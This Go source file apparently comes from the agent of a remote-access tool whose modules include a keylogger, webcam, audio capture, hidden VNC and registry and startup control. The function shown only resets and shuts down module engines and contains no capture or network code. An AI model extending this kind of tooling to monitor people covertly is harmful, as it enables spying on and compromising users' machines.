package agent

import (
	"context"
	"fmt"
)

func (a *Agent) resetModuleEngine(ctx context.Context, moduleID string, pluginID string) error {
	if a.modules == nil {
		return nil
	}

	a.modules.mu.RLock()
	entry, ok := a.modules.byID[moduleID]
	a.modules.mu.RUnlock()

	if !ok || !entry.enabled {
		return nil
	}

	var resultErr error

	switch m := entry.module.(type) {
	case *webcamModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *keyloggerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *audioModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *appVncModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown(ctx)
		}
	case *fileManagerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *taskManagerModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *tcpConnectionsModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *registryModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *startupModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *triggerMonitorModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	case *remoteDesktopModule:
		m.mu.Lock()
		previous := m.engine
		m.engine = nil
		m.requiredVersion = ""
		m.mu.Unlock()
		if previous != nil {
			previous.Shutdown()
		}
	default:
		return fmt.Errorf("module %s does not support engine reset", moduleID)
	}

	if err := a.modules.DeactivatePlugin(ctx, pluginID); err != nil {
		resultErr = combineErrors(resultErr, err)
	}

	runtime := a.moduleRuntime()
	if ctx == nil {
		ctx = context.Background()
	}
	if err := entry.module.UpdateConfig(runtime); err != nil {
		resultErr = combineErrors(resultErr, err)
	}

	return resultErr
}
